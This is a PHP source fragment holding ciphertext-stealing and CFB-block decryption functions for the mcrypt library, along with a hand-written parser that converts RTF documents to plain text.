// Implementation of (CTS) Ciphertext stealing mode (decryption) for mcrypt library
// 64-bit blocks only
function decrypt_cts($module, $data, &$iv)
{
    $outdata = "";

    $s = substr($data, 0, 8);
    $d = $s;
    $f = $iv;

    $b = "";

    for ($i = 0; $i < idiv(strlen($data), 8); $i++)
    {
        $b = $d;

        $b = xor_block($b, $f);
        $d = mdecrypt_generic($module, $d);
        $d = xor_block($d, $f);

        $outdata .= $d;

        // exchange b <-> f
        $s = $b;
        $b = $f;
        $f = $s;

        $d = substr($data, ($i + 1) * 8, 8);
    }

    $iv = $f;

    if (strlen($data) % 8 != 0)
    {
        $fbuffer = mcrypt_generic($module, $iv);
        $d = xor_block(substr($data, -(strlen($data) % 8)), $fbuffer);
        $outdata .= $d;
        $iv = xor_block($iv, $fbuffer);
    }

    $outdata = substr($outdata, 0, strlen($data));
    return $outdata;
}

function decrypt_cfbblock($module, $data, &$iv)
{
    $outdata = "";

    $p1 = substr($data, 0, 8);
    $p2 = '';

    for ($i = 0; $i < idiv(strlen($data), 8); $i++)
    {
        $temp = $p1;
        $iv = mcrypt_generic($module, $iv);

        $p2 = $p1;
        $p2 = xor_block($p2, $iv);

        $iv = $temp;

        $outdata .= $p2;

        $p1 = substr($data, ($i + 1) * 8, 8);
    }

    if (strlen($data) % 8 != 0)
    {
        $iv = mcrypt_generic($module, $iv);
        $outdata .= xor_block(substr($data, -(strlen($data) % 8)), $iv);
    }

    $outdata = substr($outdata, 0, strlen($data));
    return $outdata;
}

function rtf_isPlainText($s)
{
    $arrfailAt = array("*", "fonttbl", "colortbl", "datastore", "themedata");
    for ($i = 0; $i < count($arrfailAt); $i++)
        if (!empty($s[$arrfailAt[$i]])) return false;
    return true;
}

function rtf2text($text)
{
	
    if (!strlen($text))
        return "";
$olderr = error_reporting(0);
    // Create empty stack array.
    $document = "";
    $stack = array();
    $j = -1;
    // Read the data character-by- character…
    for ($i = 0, $len = strlen($text); $i < $len; $i++)
    {
        $c = $text[$i];

        // Depending on current character select the further actions.
        switch ($c)
        {
        // the most important key word backslash
        case "\\":
            // read next character
            $nc = $text[$i + 1];

            // If it is another backslash or nonbreaking space or hyphen,
            // then the character is plain text and add it to the output stream.
            if ($nc == '\\' && rtf_isPlainText($stack[$j])) $document .= '\\';
            elseif ($nc == '~' && rtf_isPlainText($stack[$j])) $document .= ' ';
            elseif ($nc == '_' && rtf_isPlainText($stack[$j])) $document .= '-';
            // If it is an asterisk mark, add it to the stack.
            elseif ($nc == '*') $stack[$j]["*"] = true;
            // If it is a single quote, read next two characters that are the hexadecimal notation
            // of a character we should add to the output stream.
            elseif ($nc == "'")
            {
                $hex = substr($text, $i + 2, 2);
                if (rtf_isPlainText($stack[$j]))
                    $document .= html_entity_decode("&#".hexdec($hex).";");
                //Shift the pointer.
                $i += 2;
                // Since, we’ve found the alphabetic character, the next characters are control word
                // and, possibly, some digit parameter.
            }
            elseif ($nc >= 'a' && $nc <= 'z' || $nc >= 'A' && $nc <= 'Z')
            {
                $word = "";
                $param = null;

                // Start reading characters after the backslash.
                for ($k = $i + 1, $m = 0; $k < strlen($text); $k++, $m++)
                {
                    $nc = $text[$k];
                    // If the current character is a letter and there were no digits before it,
                    // then we’re still reading the control word. If there were digits, we should stop
                    // since we reach the end of the control word.
                    if ($nc >= 'a' && $nc <= 'z' || $nc >= 'A' && $nc <= 'Z')
                    {
                        if (empty($param))
                            $word .= $nc;
                        else
                            break;
                        // If it is a digit, store the parameter.
                    }
                    elseif ($nc >= '0' && $nc <= '9')
                    $param .= $nc;
                    // Since minus sign may occur only before a digit parameter, check whether
                    // $param is empty. Otherwise, we reach the end of the control word.
                    elseif ($nc == '-')
                    {
                        if (empty($param))
                            $param .= $nc;
                        else
                            break;
                    }
                    else
                        break;
                }
                // Shift the pointer on the number of read characters.
                $i += $m - 1;

                // Start analyzing what we’ve read. We are interested mostly in control words.
                $toText = "";
                switch (strtolower($word))
                {
                // If the control word is "u", then its parameter is the decimal notation of the
                // Unicode character that should be added to the output stream.
                // We need to check whether the stack contains \ucN control word. If it does,
                // we should remove the N characters from the output stream.
                case "u":
                    $toText .= html_entity_decode("&#x".dechex($param).";");
                    $ucDelta = @$stack[$j]["uc"];
                    if ($ucDelta > 0)
                        $i += $ucDelta;
                    break;
                // Select line feeds, spaces and tabs.
                case "par":
                case "page":
                case "column":
                case "line":
                case "lbr":
                    $toText .= "\n";
                    break;
                case "emspace":
                case "enspace":
                case "qmspace":
                    $toText .= " ";
                    break;
                case "tab":
                    $toText .= "\t";
                    break;
                // Add current date and time instead of corresponding labels.
                case "chdate":
                    $toText .= date("m.d.Y");
                    break;
                case "chdpl":
                    $toText .= date("l, j F Y");
                    break;
                case "chdpa":
                    $toText .= date("D, j M Y");
                    break;
                case "chtime":
                    $toText .= date("H:i:s");
                    break;
                // Replace some reserved characters to their html analogs.
                case "emdash":
                    $toText .= html_entity_decode("&mdash;");
                    break;
                case "endash":
                    $toText .= html_entity_decode("&ndash;");
                    break;
                case "bullet":
                    $toText .= html_entity_decode("&#149;");
                    break;
                case "lquote":
                    $toText .= html_entity_decode("&lsquo;");
                    break;
                case "rquote":
                    $toText .= html_entity_decode("&rsquo;");
                    break;
                case "ldblquote":
                    $toText .= html_entity_decode("&laquo;");
                    break;
                case "rdblquote":
                    $toText .= html_entity_decode("&raquo;");
                    break;
                // Add all other to the control words stack. If a control word
                // does not include parameters, set &param to true.
                default:
                    $stack[$j][strtolower($word)] = empty($param) ? true : $param;
                    break;
                }
                // Add data to the output stream if required.
                if (rtf_isPlainText($stack[$j]))
                    $document .= $toText;
            }

            $i++;
            break;
        // If we read the opening brace {, then new subgroup starts and we add
        // new array stack element and write the data from previous stack element to it.
        case "{":
            array_push($stack, $stack[$j++]);
            break;
        // If we read the closing brace }, then we reach the end of subgroup and should remove
        // the last stack element.
        case "}":
            array_pop($stack);
            $j--;
            break;
        // Skip “trash”.
        case '\0':
        case '\r':
        case '\f':
        case '\n':
            break;
        // Add other data to the output stream if required.
        default:
            if (rtf_isPlainText($stack[$j]))
                $document .= $c;
            break;
        }
    }
    // Return result.
	error_reporting($olderr);
    return $document;
}
